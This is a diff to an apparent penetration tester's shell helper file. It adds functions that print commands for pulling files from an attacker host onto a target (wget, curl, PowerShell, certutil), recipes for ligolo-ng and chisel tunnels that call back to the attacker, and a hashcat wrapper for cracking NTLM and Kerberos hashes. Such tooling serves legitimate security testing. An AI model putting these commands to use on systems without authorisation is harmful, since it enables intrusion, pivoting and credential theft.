@@ -164,6 +164,68 @@ b64()    { if [ -n "$1" ]; then printf '%s' "$1" | base64 -w0; echo; else base64
 ub64()   { if [ -n "$1" ]; then printf '%s' "$1" | base64 -d;  echo; else base64 -d; fi; }
 urlenc() { python3 -c 'import sys,urllib.parse as u;print(u.quote(sys.argv[1] if len(sys.argv)>1 else sys.stdin.read().strip()))' "$@"; }
 
+# --- dl: build a download one-liner for the current LHOST (paste on target) -----
+# Usage: dl <file-in-cwd> [win]   -> prints wget/curl (or PowerShell) fetch cmd
+dl() {
+    [ -n "$1" ] || { echo "usage: dl <file> [win]"; return 1; }
+    [ -n "$LHOST" ] || lhost >/dev/null
+    local url="http://$LHOST:8000/$1"
+    if [ "$2" = "win" ]; then
+        echo "powershell -c \"iwr $url -OutFile C:\\Windows\\Temp\\$1\""
+        echo "certutil -urlcache -f $url $1"
+    else
+        echo "wget $url -O /tmp/$1  ||  curl -s $url -o /tmp/$1"
+    fi
+    echo "# (serve first: run \`serve\` in the dir holding $1)"
+}
+
+# --- tunnel: quick tunneling recipes (ligolo-ng / chisel) ----------------------
+# Prints the exact commands for whichever tool you have; no magic, just recall.
+tunnel() {
+    [ -n "$LHOST" ] || lhost >/dev/null
+    cat <<EOF
+# ── ligolo-ng ──────────────────────────────────────────────
+# attacker: set up the interface once
+sudo ip tuntap add user \$USER mode tun ligolo && sudo ip link set ligolo up
+./proxy -selfcert                                   # start proxy (:11601)
+# on target: connect back
+./agent -connect $LHOST:11601 -ignore-cert
+# attacker (in ligolo session): session; then add route to the pivot subnet
+sudo ip route add <SUBNET>/24 dev ligolo
+
+# ── chisel (reverse SOCKS) ─────────────────────────────────
+./chisel server -p 8080 --reverse                   # attacker
+./chisel client $LHOST:8080 R:1080:socks            # target
+# then: proxychains <tool>   (socks5 127.0.0.1 1080 in /etc/proxychains4.conf)
+EOF
+}
+
+# --- crack: pick the hashcat mode by name, run against rockyou ------------------
+# Usage: crack <hashfile> <mode>   mode ∈ ntlm|asrep|kerb|net-ntlmv2|sha512crypt
+crack() {
+    local f="$1" name="$2"
+    [ -n "$f" ] && [ -n "$name" ] || { echo "usage: crack <hashfile> <ntlm|asrep|kerb|net-ntlmv2|sha512crypt>"; return 1; }
+    local m
+    case "$name" in
+        ntlm)         m=1000;;
+        asrep)        m=18200;;
+        kerb)         m=13100;;
+        net-ntlmv2)   m=5600;;
+        sha512crypt)  m=1800;;
+        *) echo "unknown: $name"; return 1;;
+    esac
+    local wl="$WORDLISTS/rockyou.txt"; [ -f "$wl" ] || wl="$WORDLISTS/rockyou.txt.gz"
+    hashcat -m "$m" "$f" "$wl"
+}
+
+# --- cht: open a repo cheatsheet in the pager ----------------------------------
+cht() {
+    local d="$RT_DOTFILES/cheatsheets"
+    if [ -z "$1" ]; then ls "$d" 2>/dev/null | sed 's/\.md$//'; return; fi
+    local f="$d/$1.md"; [ -f "$f" ] || f=$(ls "$d/$1"* 2>/dev/null | head -1)
+    [ -f "$f" ] && { command -v batcat >/dev/null && batcat "$f" || ${PAGER:-less} "$f"; } || echo "no cheatsheet: $1"
+}
+
 # --- note: append a timestamped line to the current target's notes -------------
 note() {
     local f="${TARGET_DIR:-.}/notes/README.md"
